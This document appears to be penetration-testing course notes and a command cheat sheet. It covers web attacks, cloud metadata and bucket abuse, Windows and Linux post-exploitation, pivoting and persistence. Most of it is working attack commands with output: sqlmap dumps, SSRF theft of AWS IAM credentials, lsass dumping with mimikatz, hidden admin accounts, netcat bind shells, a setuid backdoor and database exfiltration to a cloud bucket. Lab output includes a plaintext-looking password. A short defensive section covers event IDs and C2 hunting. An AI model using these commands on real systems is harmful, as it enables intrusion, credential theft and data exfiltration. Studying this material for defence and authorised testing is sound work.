  - Reflected: Attacker sends crafted URL to victim (phising email) and victim visit the legitimate site and execute the script
- What XSS can do
  - Password guessing attack to internal app
  - Add a web browser key stroke logger
  - Port scan internal server
  - Capture screen
  - Capture mic or webcam
  - Steal a credential for creating a fake login page
  - Redirect a form hosted by attacker
  - Deploy JS cryptominer
  - Steal a  cookie

### SQLinjection

```
f"SELECT filename FROM dropbox WHERE owner = '{}';".format(user_input)

--> blake' OR 'a'='a

SELECT filename FROM dropbox WHERE owner = 'blake' OR 'a'='a';
```

sqlmap

```
sqlmap -u 'http://www.rookaviary.com/email_search.php?search=Taylor'
sqlmap -u 'http://www.rookaviary.com/email_search.php?search=Taylor' --dbs
sqlmap -u 'http://www.rookaviary.com/email_search.php?search=Taylor' -D web_app --tables
sqlmap -u 'http://www.rookaviary.com/email_search.php?search=Taylor' -D web_app -T users --columns
sqlmap -u 'http://www.rookaviary.com/email_search.php?search=Taylor' -D web_app -T users --dump
sqlmap -u "https://example.com/login" --data="username=admin&password=1234"
```

### SSRF

Have the server facing the attacker access other web sites typically hidden by FW, or its local files such as `/etc/passwd`. Application local files are more interesting than OS files, such as config, /etc/environment, /proc/NNN/environ...

### IMDS: Instance MetaData Service

AWS

```
curl -s http://169.254.169.254/latest/dynamic/instance-identity/document 
{
  "accountId" : "171510992009",
  "architecture" : "x86_64",
  "availabilityZone" : "ap-northeast-1c",
  "billingProducts" : null,
  "devpayProductCodes" : null,
  "marketplaceProductCodes" : null,
  "imageId" : "ami-089636926219b141b",
  "instanceId" : "i-0c4863ffe6255dcfe",
  "instanceType" : "t3.nano",
  "kernelId" : null,
  "pendingTime" : "2025-05-20T15:03:58Z",
  "privateIp" : "10.0.0.77",
  "ramdiskId" : null,
  "region" : "ap-northeast-1",
  "version" : "2017-09-30"
}
```

Azure: `Metadata: true`

```
azurevm $ curl --silent
"http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAdd
ress/0/publicIpAddress?api-version=2017-04-02&format=text"; echo
{ "error": "Bad request: . Required metadata header not specified" }
azurevm $ curl --silent -H "Metadata: true"
"http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAdd
ress/0/publicIpAddress?api-version=2017-04-02&format=text"; echo
52.168.72.115
```

Google: `Metadata-Flavor: Google`

```
gcpvm $ curl
http://metadata.google.internal/computeMetadata/v1/project/project-id;
echo
<p>Your client does not have permission to get URL
<code>/computeMetadata/v1/project/project-id</code> from this server.
Missing Metadata-Flavor:Google header. <ins>That's all we know.</ins>
gcpvm $ curl -H 'Metadata-Flavor: Google'
http://metadata.google.internal/computeMetadata/v1/project/project-id;
echo
```


## Insecure cloud storage

### Cloud Storage Access

- AWS: https://s3.amazonaws.com/BUCKETNAME
- GCP: https://www.googleapis.com/storage/v1/b/BUCKETNAME
- Azure: https://ACCOUNTNAME.blob.core.windows.net/CONTAINERNAME

### Bucket finder for AWS, by wordlist

```
$ bucket_finder.rb word_list.txt --download
Bucket found but access denied: microsoft
Bucket does not exist: sans-dev
Bucket Found: joshsprivatestuff (
http://s3.amazonaws.com/joshsprivatestuff ) <Downloaded>
http://s3.amazonaws.com/joshsprivatestuff/01%20Infant%20Selachii.wav
```

### GCP Bucket Brute

```
$ gcpbucketbrute.py -u -k falsimentis <-- Keyword
Generated 1216 bucket permutations.
UNAUTHENTICATED ACCESS ALLOWED: falsimentis-dev
- UNAUTHENTICATED LISTABLE (storage.objects.list)
- UNAUTHENTICATED READABLE (storage.objects.get)
$ gsutil ls gs://falsimentis-dev
gs://falsimentis-dev/01 Toddler Selachimorpha.wav  <-- DOWNLOAD
gsutil -m cp -r gs://falsimentis-dev .
```

### Basic Blob Finder for Azure

```
$ basicblobfinder.py namelist
Valid storage account and container name: falsimentis:falsimentis-
container
Blob data objects:
https://falsimentis.blob.core.windows.net/falsimentis-container/01
Newborn Euselachii.wav
```

# 5

## Post exploit

- Modifying existing tools to evade detection: change hex-level
- Make the malicious code look legitimate: obfuscation, wrapping (code porting), and encoding (base64)
- Disabling endpoint tools with privilege escalation attacks: Endpoint security resides on the 0 ring (kernel mode), users including local admin resides on the 3 ring (user mode)
- Modifying their tactics to use tools and techniques that achieve their goals but do not raise an alert indication

## Bring Your Own Vulnerable Driver

To gain access to kernel mode to disable endpoint security, install vulnerable Microsoft-signed driver brought by attacker. This signing process is not implemented with revocation but only with block rules.

## Prevent malicious app execution

- Vendor patching
- Application allowlists: such as `Windows AppLocker`, intercept the execution process before it
- Circumvent Application allowlists: `LOL`, such as:
  - `\procdump.exe -accepteula -ma lsass.exe lsass.dmp` rather than mimikatz.exe
  - `InstallUtil /U shellcode.exe` rather than `shellcode.exe`: AppLocker cannot see the process inside of InstallUtil where the program can run, uninstallation even if the app is actually installed, can kick malicious process

## Linux LOL

| target | command |
| --- | --- |
| What can I do with `sudo` | sudo -l |
| Are there uncommon SETUID files (anyone can execute the file with owner priv) | find / -perm -4000 -uid 0 |
| Is Netcat installed | which nc |
| Is Smbclient installed | which smbclient |
| Any passwords in shell history | find / -name "*history" |
| Any passwords in web files | grep -iR password /var/www |
| Any unprotected SSH keys? | cat /home/\*/.ssh/\* |

## Lateral Movement

### Meterpreter Pivoting

#### Forwarding

```
 [Attacker]     [Compromised]    [Target]
96.97.98.99 --> 10.10.10.11 --> 10.10.10.100
```

On 10.10.10.11, something like local port forwarding, `96.97.98.99:8000` --> `10.10.10.100:80`

```
meterpreter > portfwd add -l 8000 -r 10.10.10.100 -p 80
```

#### Routing

Telling Metasploit to use the session already established to the pivot point, as a gateway, to access whatever it specifies (i.e., 10.10.10.0/24).

```
meterpreter > background
[*] Backgrounding session 1...
msf5 exploit(windows/smb/psexec) > route add 10.10.10.0/24 1
msf5 exploit(windows/smb/psexec) > set RHOST 10.10.10.100
msf5 exploit(windows/smb/psexec) > exploit
[*] Started reverse TCP handler on 10.10.10.100:4444
[*] 10.10.10.11:445 - Selecting PowerShell target
[*] 10.10.10.11:445 - Executing the payload...
[+] 10.10.10.11:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (180291 bytes) to 10.10.10.100
[*] Meterpreter session 2 opened (10.10.10.100:4444 -> 10.10.10.11:1622) at 2020-01-24 11:45:31 +0000
meterpreter >
```

#### Port scanning on a routed session

After pivotting, we do recon 

```
meterpreter > run arp_scanner -r 10.10.10.0/24
[*] ARP Scanning 10.10.10.0/24
[*] IP: 10.10.10.1 MAC 00:50:56:c0:00:08
[*] IP: 10.10.10.11 MAC 00:0c:29:76:53:e7
[*] IP: 10.10.10.100 MAC 00:0c:29:76:8a:75
meterpreter > background
msf5 exploit(windows/smb/psexec) > route add 10.10.10.0/24 1
msf5 exploit(windows/smb/psexec) > use auxiliary/scanner/portscan/tcp
msf5 auxiliary(scanner/portscan/tcp) > set RHOSTS 10.10.10.1,11,100
msf5 auxiliary(scanner/portscan/tcp) > set PORTS 22,25,80,135,445,631
msf5 auxiliary(scanner/portscan/tcp) > run
[+] 10.10.10.1: - 10.10.10.1:22 - TCP OPEN
[*] 10.10.10.1,11,100: - Scanned 1 of 3 hosts (33% complete)
[+] 10.10.10.11: - 10.10.10.11:135 - TCP OPEN
[+] 10.10.10.11: - 10.10.10.11:445 - TCP OPEN
[*] 10.10.10.1,11,100: - Scanned 2 of 3 hosts (66% complete)
```

### Portforwarding

#### SSH for Linux

```
sec504@slingshot:~$ ssh -L 8000:10.10.10.100:80 victortimko@10.10.10.11
Password:
Last login: Fri Jan 24 07:25:00 2020 from 10.10.10.100
victim:~ $
```

#### netsh for Windows

```
C:\WINDOWS\system32> netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=8000 connectaddress=10.10.10.100 connectport=80
C:\WINDOWS\system32> netstat -nato | findstr :8000
TCP 0.0.0.0:8000 0.0.0.0:0 LISTENING 252 InHost
```

## Persistence

- Regain access
- Avoid detection
- Preserve privileges and access
- Flexible triggers for reestablishing access

### Create account

```
meterpreter > execute -f "net user /add assetmgtacct Att@ckerPassw"
Process 6892 created.
meterpreter > execute -f "net localgroup administrators /add assetmgtacct"
Process 7192 created.
meterpreter > execute -i -f "net user"
Process 3436 created.
Channel 3 created.
User accounts for \\WS-F43G01
----------------------------------------------------------------------------
Administrator assetmgtacct
DefaultAccount WDAGUtilityAccount
Guest Sec504
The command completed with one or more errors.
```

### As a service

```
meterpreter > background
[*] Backgrounding session 1...
msf6 > use exploit/windows/local/persistence_service
msf6 exploit(windows/local/persistence_service) > set session 1
msf6 exploit(windows/local/persistence_service) > set lport 4445
msf6 exploit(windows/local/persistence_service) > set lhost 10.10.75.1
msf6 exploit(windows/local/persistence_service) > exploit
[*] Started reverse TCP handler on 10.10.75.1:4445
[*] Running module against SEC504STUDENT
[+] Meterpreter service exe written to C:\WINDOWS\TEMP\LAGYmO.exe
[*] Creating service EPjXQ
[*] Meterpreter session 2 opened (10.10.75.1:4445 -> 10.10.0.1:1546) at
2021-06-15 16:41:10
```

### WMI Event Subscription

```
C:\Temp> mofcomp wmi.mof
Parsing MOF file: wmi.mof
Done!
```

By default Meterpreter's `wmi_persistence` will make a hook for reestablishing, for specific failed logons, adding a delay of msec, after the logon failure

```
meterpreter > background
[*] Backgrounding session 2...
msf6 > use exploit/windows/local/wmi_persistence
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/wmi_persistence) > set session 2
msf6 exploit(windows/local/wmi_persistence) > set lhost eth0
msf6 exploit(windows/local/wmi_persistence) > set username_trigger josh
msf6 exploit(windows/local/wmi_persistence) > set callback_interval 1000
msf6 exploit(windows/local/wmi_persistence) > exploit
[*] Installing Persistence...
[+] Persistence installed! Call a shell using "smbclient \\\\10.10.0.1\\C$ -   <------- NOTE
U josh <arbitrary password>"
[*] Clean up Meterpreter RC file:
/home/sec504/.msf4/logs/wmi_persistence/10.10.0.1_20210622.1735/10.10.0.1_20
210622.1735.rc
```

### Kerberos

1. Compromise DC: exploit domain admin or get compromised backup
2. Get password hash for user `krbtgt`
3. Mimikatz or Impacket let us t oforge TGT using krbtgt password hash
4. TGT bypasses Kerberos authentication

### Webshell

### Defense

#### Windows

- Event subscriptions that contain queries: `Get-WMIObject -Namespace root\Subscription -Class __EventFilter | fl -property query`
- `Autoruns` for auto-start programs
- Monitor Windows Events:
  - 4624: An account was successfully logged on
  - 4634: An account was logged off
  - 4672: Special privileges assigned to new logon
  - 4732: A member was added to a security-enabled local group
  - 4648: A logon was attempted using explicit credentials
  - 4688: A new process has been created
  - 4697: A service was installed in the system
  - 4768: A Kerberos authentication ticket (TGT) was requested

#### RITA: Real Intelligence Threat Analytics, rather than IDS

- Look for patterns that matches C2 activities in the log of packets
  - Too long connection
  - Too much of fixed sized packets
  - Consistent packet intervals
  - Consistent size of packets or bytes sent
- Uses logs generated from Zeek network analysis framework
- Offline analysis only
- Does not identify a specific C2 tools but only C2 activities
- Higher score means more confident

```
sec504@slingshot:~$ sudo service mongod start
sec504@slingshot:~$ mkdir zeeklogs && cd zeeklogs
sec504@slingshot:~/zeeklogs$ zeek -Cr ~/big-capture.pcap
sec504@slingshot:~/zeeklogs$ rita import . mynetwork
sec504@slingshot:~/zeeklogs$ rita html-report mynetwork
```

```
sec504@slingshot:~$ rita show-long-connections -H mynetwork | head -15
+---------------+-----------------+--------------------------+-----------+
| SOURCE IP | DESTINATION IP | DSTPORT:PROTOCOL:SERVICE | DURATION |
+---------------+-----------------+--------------------------+-----------+
| 10.55.100.100 | 65.52.108.225 | 443:tcp:- | 23h57m02s |
| 10.55.100.107 | 111.221.29.113 | 443:tcp:- | 23h57m00s |
| 10.55.100.109 | 65.52.108.218 | 443:tcp:- | 01h49m22s |
| 10.55.100.104 | 65.52.108.204 | 443:tcp:- | 01h28m45s |
| 10.55.182.100 | 104.244.43.112 | 443:tcp:ssl, | 10m00s |
| | | 443:tcp:- | |
| 10.55.182.100 | 23.52.162.21 | 443:tcp:ssl | 09m50s |
| 10.55.182.100 | 198.8.70.210 | 443:tcp:-, | 07m29s |
| | | 443:tcp:ssl | |
| 10.55.182.100 | 104.20.168.10 | 443:tcp:ssl | 07m25s |
| 10.55.182.100 | 104.16.162.13 | 443:tcp:ssl | 06m40s |
| 10.55.100.108 | 65.52.108.191 | 443:tcp:ssl | 06m00s |
```

```
sec504@slingshot:~$ rita show-exploded-dns mynetwork | head -15
Domain,Unique Subdomains,Times Looked Up
totallynotevil.net,7822,7822
microsoft.com,36,5264
fastly.net,17,603
map.fastly.net,16,601
mp.microsoft.com,15,315
delivery.mp.microsoft.com,9,104
windowsupdate.com,8,176
akamaiedge.net,8,1791
dl.delivery.mp.microsoft.com,8,37
services.mozilla.com,8,2319
mozilla.com,8,2319
tlu.dl.delivery.mp.microsoft.com,7,23
cloudfront.net,7,262
download.windowsupdate.com,7,104
```

## Data Collection

### Linux password harvesting

| Target | Command |
| Process list | ps -efw |
| Users enter password in a login prompt by mistake | last -f /var/log/btmp |
| Users enter password in shell | cat /home/\*/.\*history |
| Saved passwords in web files | grep -iR password /var/www |
| SSH keys | cat /home/\*/.ssh/\* |
| History files of various types | cat /home/*/.mysql_history |
| AWS credentials | cat /home/.aws/credentials |
| Azure login token | cat /home/*/.azure/accessTokens.json |

### sudo 

```
azawadow@x33-p98543:~$ sudo -l
Matching Defaults entries for azawadow on x33-p98543:
env_reset, exempt_group=sudo, mail_badpass,
secure_path=/usr/local/sbin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
User azawadow may run the following commands on x33-p98543:
(root) /usr/bin/gdb
azawadow@x33-p98543:~$ sudo gdb -q
(gdb) shell
root@x33-p98543:~# id
uid=0(root) gid=0(root) groups=0(root)
root@x33-p98543:~#
```

### Mimikatz

Cannot run directly, but can work on dumped memory by lsass

```
C:\temp> .\mimikatz.exe
Program 'mimikatz.exe' failed to run: Operation did not complete successfully because the file contains a virus or potentially unwanted software
C:\temp> .\procdump64.exe -accepteula -ma lsass.exe lsass.dmp
ProcDump v9.0 - Sysinternals process dump utility
Copyright (C) 2009-2017 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com
[12:58:44] Dump 1 initiated: C:\temp\lsass.dmp
[13:02:44] Dump 1 writing: Estimated dump file size is 51 MB.
[13:02:45] Dump 1 complete: 51 MB written in 240.7 seconds

---

C:\Tools\mimikatz> .\mimikatz.exe
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonPasswords full
Opening : 'lsass.dmp' file for minidump...
Session : Interactive from 1
User Name : jwrig
Domain : DELL
msv :
[00000003] Primary
* Username : jwright@hasborg.com
* Domain : MicrosoftAccount
* NTLM : 920a********REDACTED********3fa4
ssp :
credman :
[00000000]
* Username : admin
* Domain : 172.16.0.10
* Password : _AhxmAKs3Xwx7VhQ@sCo
```

### Cloud Environment

#### AWSCLIL

| subcommand | functionality |
| --- | --- |
| get-caller-identity | whoami like |
| ec2 describe-instances | List of instances |
| s3 ls | List buckets |
| lambda list-functions | List lambda functions |
| iam list-roles | List iam roles |
| iam list-users | List iam users |
| logs describe-log-groups | list CloudWatch logs |

#### AWS IMDSv1 (via SSRF)

```
~ $ curl -v
http://login.falsimentis.com/imgget.php?logo=http://169.254.169.254/latest/meta-
data/iam/security-credentials/; echo
aws-elasticbeanstalk-ec2-role
~ $ curl -v
http://login.falsimentis.com/imgget.php?logo=http://169.254.169.254/latest/meta-
data/iam/security-credentials/aws-elasticbeanstalk-ec2-role/; echo
{
"Code" : "Success",
"LastUpdated" : "2021-01-13T11:51:30Z",
"Type" : "AWS-HMAC",
"AccessKeyId" : "ASIAXXXXXXXXXXXXEETO",
"SecretAccessKey" : "Z/neXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXVT9",
"Token" : IQoJbajhUv5lxwL...QpGZhzL6/BN4uVgBP/zZkhShLmmYHULH6r5p91uG+Q==",
"Expiration" : "2021-01-13T18:07:24Z"
}
```

#### Pacu

Metasploit for AWS

```
root@allevil:~/pacu# ./cli.py
Pacu (jmerckle-falsimentis:No Keys Set) > import_keys jmerckle
Pacu (jmerckle-falsimentis:imported-jmerckle) > run iam__enum_permissions
Running module iam__enum_permissions...
Pacu (jmerckle-falsimentis:imported-jmerckle) > run iam__privesc_scan
Running module iam__privesc_scan...
[iam__privesc_scan] Escalation methods for current user:
[iam__privesc_scan] CONFIRMED: PutUserPolicy
[iam__privesc_scan] Attempting confirmed privilege escalation methods...
[iam__privesc_scan] Successfully added an inline policy named dnr9s7e846!
You should now have administrator permissions.
```

#### gcloud (like awsclli, not attack tools)

```
root@allevil# gcloud sql instances list  <-- LIST DB INSTANCES
fm-research MYSQL_8_0 us-east1-c db-custom-4-26624 34.138.195.165
- RUNNABLE
root@allevil# gcloud sql databases list -i fm-research  <-- LIST SCHEMES FOR THE INSTANCE
ai utf8 utf8_general_ci
root@allevil# gsutil mb gs://sqlexfil  <-- CREATE BUCKET FOR DOWNLOADING DB
Creating gs://sqlexfil/...
root@allevil# gsutil acl ch -u jmerckle@falsimentis.com:WRITE gs://sqlexfil  <-- GRANT THE CURRENT USER ACCESS TO THE BUCKET
Updated ACL on gs://sqlexfil/
root@allevil# gcloud sql export sql fm-research --database=ai  <-- EXPORT DB DUMP TO THE BUCKET
gs://sqlexfil/sqldump.gz
Exporting Cloud SQL instance...done.
Exported [https://sqladmin.googleapis.com/sql/v1beta4/projects/cryptic-
woods-298720/instances/fm-research] to [gs://sqlexfil/sqldump.gz].
root@allevil# gsutil cp gs://sqlexfil/sqldump.gz .  <-- DOWNLOAD THE DUMP FROM THE BUCKET
Copying gs://sqlexfil/sqldump.gz...
- [1 files][ 342.0 MiB/ 342.0 MiB]
```

#### CloudMapper for AWS

```
cloudmapper.py prepare --config config.json --account acctname
cloudmapper.py report --config config.json --account acctname
cloudmapper.py webserver
```


#### ScoutSuite for AWS, Azure, GCP

Scan vulns or misconfigured resources

# A: Tools

## nmap

Run an aggressive Nmap scan (scan, OS fingerprint, version scan, and NSE scripts) and save output to a file for future reference

```
$ sudo nmap -A target --reason -o file
```

Scan specific port(s) on target

```
$ sudo nmap -p port(s) target --reason
```

Perform a version scan on specific port(s)

```
$ sudo nmap -sV -p port(s) target --reason
```

## Metasploit

Steps to set up an exploit/payload combo

Launch Metasploit

```
$ msfconsole
```

Search for an exploit matching keyword

```
msf > search keyword type:exploit
```

Use a particularly stable exploit

```
msf > use exploit/windows/smb/psexec
```

Set the SMB User

```
msf > set SMBUser [ADMIN_USER]
```

Set the SMB Password

```
msf > set SMBPass [ADMIN PASS]
```

Set the SMB Domain

```
msf > set SMBDomain [Windows Domain]
```

Set the Exploit Payload

```
msf > set PAYLOAD windows/meterpreter/reverse_tcp
```

Set LHOST

```
msf > set LHOST tun0
```

Set the target information

```
msf > set RHOSTS 10.142.145.120
```

Once all options are set, run:

```
msf > exploit
```

You might need to list and interact with session(s)

```
msf > sessions -l
msf > sessions -i SessionNum
meterpreter> hashdump
```

## Meterpreter

```
meterpreter > shell
meterpreter > migrate -N lsass.exe
meterpreter > background
[*] Backgrounding session 1...
msf5 exploit(windows/smb/psexec) >
msf5 exploit(windows/smb/psexec) >
route add 10.10.0.2 255.255.255.255 1
[*] Route added
```

## Hashcat

Crack passwords with a wordlist in automated mode

```
hashcat hash_file.txt word_list.txt
```

Display cracked passwords

```
hashcat hash_file.txt --show
```

Display uncracked passwords

```
hashcat hash_file.txt --left
```

## legba

```
legba -U josh -P password -T 10.0.0.1 ssh
legba -U user_list.txt -P password_list.txt -T 10.0.0.1 smb
```

## net (Windows)

View currently active shares

```
> net iuse
```

To access drives

```
> net use Z:
```

Create local admin user and group, and delete a user

```
> net user /add <USER_NAME> <PASSWORD>
> net localgroup <GROUP_NAME> /add <USER_NAME>
> net user <USER_NAME> /delete
```

Map local drive to remote C:

```
> net use * \\target\C$ <PASSWORD> /u:<TARGET_IP>\<USER_NAME>
```

View local shares

```
> net share
```

## smbclient

```
smbclient -L //10.0.0.1 -U win
smbclient //10.0.0.1/C$ -U win -m SMB3
```

## Netcat

Listner

```
nc -lnvp 4444
```

> -n: no dns

Connect

```
nc -vn 10.0.0.1 4444
```

Send a shell from Listener

```
nc -lnpv 4444  -e /bin/bash
```

Send (content of) file 

```
nc -lnvp 4444 < <FILE>
```

Persistent shell

```
while [ 1 ]; do echo "started"; nc lnp 4444 -e /bin/bash; done
```

## Find

Find files with SETUID flag, owned by root (files that can executed with root priv)

```
find / -uid 0 -type f -perm -4000 2> /dev/null
```

Preserving root

```
$ cp /bin/sh /tmp/backdoor
$ sudo chown root:root /tmp/backdoor
$ sudo chmod 4755 /tmp/backdoor
$ /tmp/backdoor –p
```

## Sqlmap

```
sqlmap -u "https://example.com/login" --data "username=1&password=2" --dbs
sqlmap -u "https://example.com/login" --data "username=1&password=2" -D db_example --tables
sqlmap -u "https://example.com/login" --data "username=1&password=2" -D db_example -T table_example --columns
sqlmap -u "https://example.com/login" --data "username=1&password=2" -D db_example -T table_example --dump
```